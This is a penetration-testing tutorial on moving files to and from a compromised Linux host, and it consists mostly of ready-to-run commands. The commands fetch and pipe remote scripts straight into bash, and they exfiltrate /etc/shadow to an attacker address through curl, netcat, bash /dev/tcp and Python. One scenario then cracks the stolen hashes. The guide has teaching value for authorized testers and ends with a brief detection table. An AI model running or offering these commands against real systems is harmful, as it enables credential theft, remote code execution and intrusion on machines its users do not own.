# 🐧 Linux File Transfer Methods — Complete Guide

## 📖 When You Need Linux File Transfers

During ethical hacking, you'll often compromise a Linux machine and need to:

* **Upload** enumeration tools (LinPEAS, pspy, exploits)
* **Download** sensitive files (/etc/shadow, SSH keys, databases)
* **Transfer** between two Linux machines

```text
  ATTACKER (Kali)                           TARGET (Linux Victim)
  ┌──────────────┐                         ┌──────────────────┐
  │              │  Upload tools ───────▶  │  Common tools:   │
  │  Tools:      │                         │  • wget           │
  │  linpeas.sh  │  Download data ◀──────  │  • curl           │
  │  pspy64      │                         │  • netcat (nc)    │
  │  exploits    │                         │  • python         │
  │              │                         │  • bash /dev/tcp  │
  └──────────────┘                         │  • scp            │
                                           └──────────────────┘
```

---

## 1️⃣ wget — The Classic Downloader

**wget** is pre-installed on most Linux systems.

### Basic Download

```bash
# Download file to current directory
wget http://10.10.14.5/linpeas.sh

# Download and save with custom name
wget http://10.10.14.5/linpeas.sh -O /tmp/lin.sh

# Download quietly (no output)
wget http://10.10.14.5/linpeas.sh -q -O /tmp/lin.sh
```

### Download and Execute (Fileless)

```bash
# Download and run directly — no file saved to disk!
wget http://10.10.14.5/linpeas.sh -O - | bash

# Same thing, quiet mode
wget -q http://10.10.14.5/linpeas.sh -O - | sh
```

### Download Multiple Files

```bash
# Download list of files
wget -i urls.txt

# Download entire directory listing
wget -r http://10.10.14.5/tools/
```

### Specify User-Agent (Bypass Filters)

```bash
wget http://10.10.14.5/tool --user-agent="Mozilla/5.0"
```

---

## 2️⃣ curl — Versatile Transfer Tool

**curl** supports many protocols: HTTP, HTTPS, FTP, SCP, SFTP, etc.

### Basic Download

```bash
# Download and display to screen
curl http://10.10.14.5/linpeas.sh

# Download and save to file
curl http://10.10.14.5/linpeas.sh -o linpeas.sh

# Download keeping server filename
curl -O http://10.10.14.5/linpeas.sh

# Follow redirects
curl -L http://10.10.14.5/linpeas.sh -o linpeas.sh

# Silent mode
curl -s http://10.10.14.5/linpeas.sh -o linpeas.sh
```

### Download and Execute (Fileless)

```bash
# Pipe directly to bash
curl http://10.10.14.5/linpeas.sh | bash

# Silent + pipe
curl -s http://10.10.14.5/linpeas.sh | bash
```

### Upload Files FROM Target (POST)

```bash
# Upload file to attacker's server
curl -X POST http://10.10.14.5/upload -F 'file=@/etc/shadow'

# Upload with PUT
curl -T /etc/shadow http://10.10.14.5/upload/shadow

# Send file content in POST body
curl -d @/etc/passwd http://10.10.14.5/receive
```

### Download via FTP

```bash
curl ftp://10.10.14.5/tool.sh -o tool.sh
curl ftp://user:pass@10.10.14.5/tool.sh -o tool.sh
```

---

## 3️⃣ SCP — Secure Copy Over SSH

**SCP** is encrypted file transfer using SSH. Requires SSH access.

### Download FROM Remote (Target → Attacker)

```bash
# Copy file from target to attacker
scp user@TARGET_IP:/etc/shadow /tmp/shadow

# Copy entire directory
scp -r user@TARGET_IP:/var/www/html/ /tmp/website/

# Using specific SSH key
scp -i id_rsa user@TARGET_IP:/tmp/loot.zip /tmp/
```

### Upload TO Remote (Attacker → Target)

```bash
# Copy file from attacker to target
scp linpeas.sh user@TARGET_IP:/tmp/linpeas.sh

# Copy entire directory
scp -r tools/ user@TARGET_IP:/tmp/tools/

# Specify SSH port
scp -P 2222 tool.sh user@TARGET_IP:/tmp/
```

### Diagram

```text
  ATTACKER                        TARGET
  ┌──────────┐    SSH (port 22)   ┌──────────┐
  │          │ ─────────────────▶ │          │
  │  scp     │   Encrypted file   │  SSH     │
  │  client  │   transfer         │  server  │
  │          │ ◀───────────────── │          │
  └──────────┘                    └──────────┘
```

---

## 4️⃣ Netcat (nc) — Raw TCP File Transfer

**Netcat** transfers files over a raw TCP connection. No authentication, no encryption — but very useful when nothing else works.

### Transfer File: Attacker → Target

**Attacker — Send file:**

```bash
# Method 1: Pipe file to netcat
nc -nlvp 4444 < linpeas.sh
```

**Target — Receive file:**

```bash
nc ATTACKER_IP 4444 > /tmp/linpeas.sh
```

### Transfer File: Target → Attacker

**Attacker — Listen to receive:**

```bash
nc -nlvp 4444 > received_shadow
```

**Target — Send file:**

```bash
nc ATTACKER_IP 4444 < /etc/shadow
```

### Diagram

```text
  SENDER                           RECEIVER
  ┌──────────┐   Raw TCP (4444)   ┌──────────┐
  │          │ ─────────────────▶ │          │
  │  nc      │   File bytes       │  nc      │
  │  (send)  │   No encryption!   │ (listen) │
  │          │                    │          │
  └──────────┘                    └──────────┘
```

> ⚠ Netcat has NO progress indicator. Wait a moment then Ctrl+C when done.

---

## 5️⃣ Bash /dev/tcp (No Tools Needed!)

If wget, curl, and nc are ALL missing, you can use bash built-in networking!

### Download File Using /dev/tcp

```bash
# Connect to HTTP server and download
exec 3<>/dev/tcp/10.10.14.5/80
echo -e "GET /linpeas.sh HTTP/1.1\r\nHost: 10.10.14.5\r\nConnection: close\r\n\r\n" >&3
cat <&3 > /tmp/linpeas.sh
```

### Send File Using /dev/tcp

```bash
# Attacker listens:
#   nc -nlvp 4444 > received_file

# Target sends:
cat /etc/shadow > /dev/tcp/ATTACKER_IP/4444
```

> This works because `/dev/tcp` is a bash pseudo-device for TCP connections.

---

## 6️⃣ Python (Almost Always Available)

### Python HTTP Download

```bash
# Python 3
python3 -c "import urllib.request; urllib.request.urlretrieve('http://10.10.14.5/linpeas.sh', '/tmp/linpeas.sh')"

# Python 2
python2 -c "import urllib; urllib.urlretrieve('http://10.10.14.5/linpeas.sh', '/tmp/linpeas.sh')"
```

### Python HTTP Upload

```bash
python3 -c "
import requests
files = {'file': open('/etc/shadow','rb')}
requests.post('http://10.10.14.5/upload', files=files)
"
```

---

## 7️⃣ PHP (On Web Servers)

```bash
# Download file
php -r "file_put_contents('/tmp/linpeas.sh', file_get_contents('http://10.10.14.5/linpeas.sh'));"

# Copy from URL
php -r "copy('http://10.10.14.5/tool.sh', '/tmp/tool.sh');"
```

---

## 8️⃣ Perl

```bash
perl -e 'use LWP::Simple; getstore("http://10.10.14.5/linpeas.sh", "/tmp/linpeas.sh");'
```

---

## 9️⃣ Ruby

```bash
ruby -e "require 'net/http'; File.write('/tmp/linpeas.sh', Net::HTTP.get(URI('http://10.10.14.5/linpeas.sh')))"
```

---

## 🔟 Base64 Copy-Paste (Last Resort)

When NO network transfer works, you can **encode a file as text** and copy-paste it.

**Attacker — Encode file:**

```bash
base64 -w 0 linpeas.sh
# Output: IyEvYmluL2Jhc2gKI....(long base64 string)
```

**Target — Decode and save:**

```bash
echo "IyEvYmluL2Jhc2gKI...." | base64 -d > /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
```

---

## 🔥 Realistic Scenarios

---

### Scenario 1: Got Shell but wget/curl Missing

```text
PROBLEM: Minimal Linux install — no wget, no curl, no nc

CHECK what's available:
┌──────────────────────────────────────┐
│ which wget     → not found          │
│ which curl     → not found          │
│ which nc       → not found          │
│ which python3  → /usr/bin/python3 ✅ │
└──────────────────────────────────────┘

SOLUTION: Use Python
┌──────────────────────────────────────────────────────────────────┐
│ python3 -c "import urllib.request;                               │
│     urllib.request.urlretrieve('http://10.10.14.5/linpeas.sh',  │
│     '/tmp/linpeas.sh')"                                          │
└──────────────────────────────────────────────────────────────────┘
```

---

### Scenario 2: Exfiltrate /etc/shadow to Attacker

```text
ATTACKER:
┌──────────────────────────────────────┐
│ nc -nlvp 9001 > shadow.txt          │
└──────────────────────────────────────┘

TARGET:
┌──────────────────────────────────────┐
│ cat /etc/shadow | nc 10.10.14.5 9001│
└──────────────────────────────────────┘

ATTACKER (now has shadow file):
┌──────────────────────────────────────┐
│ cat shadow.txt                       │
│ john shadow.txt --wordlist=rockyou   │
└──────────────────────────────────────┘
```

---

### Scenario 3: Transfer via SSH (Most Secure)

```text
SITUATION: You found SSH private key on target

ATTACKER:
┌───────────────────────────────────────────────────────┐
│ # Upload LinPEAS to target                            │
│ scp -i found_key linpeas.sh user@10.0.0.5:/tmp/      │
│                                                       │
│ # Download everything from /home                      │
│ scp -i found_key -r user@10.0.0.5:/home/ ./loot/     │
└───────────────────────────────────────────────────────┘
```

---

## 📊 Linux Transfer Methods Comparison

| Method | Available By Default | Encrypted | Fileless | Complexity |
| --- | --- | --- | --- | --- |
| wget | Usually ✅ | ❌ | ✅ (pipe to bash) | ⭐ Easy |
| curl | Usually ✅ | ❌ | ✅ (pipe to bash) | ⭐ Easy |
| SCP | If SSH ✅ | ✅ | ❌ | ⭐ Easy |
| Netcat | Sometimes | ❌ | ❌ | ⭐⭐ |
| /dev/tcp | Bash only ✅ | ❌ | ❌ | ⭐⭐⭐ |
| Python | Usually ✅ | ❌ | ❌ | ⭐⭐ |
| PHP | On web servers | ❌ | ❌ | ⭐⭐ |
| Base64 | Always ✅ | ❌ | ❌ | ⭐⭐ |

---

## 🛡 Blue Team — Detection

| Transfer Method | What to Monitor |
| --- | --- |
| wget/curl | Outbound HTTP from servers |
| Netcat | Unusual TCP connections |
| SCP | SSH login events |
| /dev/tcp | Bash process network activity |
| Base64 | Large clipboard or echo operations |

---

## ⚠ Ethical Reminder

* ✅ Only use on systems with **written authorization**
* ✅ Practice in your own lab
* ❌ Never exfiltrate real data without permission
